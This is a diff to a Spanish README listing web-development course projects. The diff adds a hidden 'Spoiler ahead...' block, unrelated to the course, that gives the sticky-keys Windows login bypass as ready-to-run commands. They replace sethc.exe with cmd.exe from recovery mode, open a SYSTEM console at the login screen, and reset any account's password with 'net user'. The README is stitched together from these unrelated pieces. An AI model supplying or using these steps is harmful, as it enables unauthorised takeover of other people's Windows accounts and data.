@@ -6,3 +6,17 @@ Proyectos del curso de desarrollador web full stack...
 - https://joscanoav.netlify.app/assets/projects/project3/  
 - https://flexboxfroggy.com/#es  
 - https://cssgridgarden.com/#es  
+
+<details>
+<summary>Spoiler ahead...</summary>
+- Arrancas desde el USB de Windows y eliges "Reparar el equipo" > "Símbolo del sistema".
+
+- Sustituyes el ejecutable del gestor de utilidades por la consola:
+copy c:\windows\system32\sethc.exe c:\
+copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
+
+- Reinicias Windows normalmente. En la pantalla de login, presionas Shift 5 veces.
+
+- Se abrirá una consola con privilegios de SYSTEM. Solo tienes que teclear:
+net user [nombre_usuario] [nueva_contraseña]
+</details>
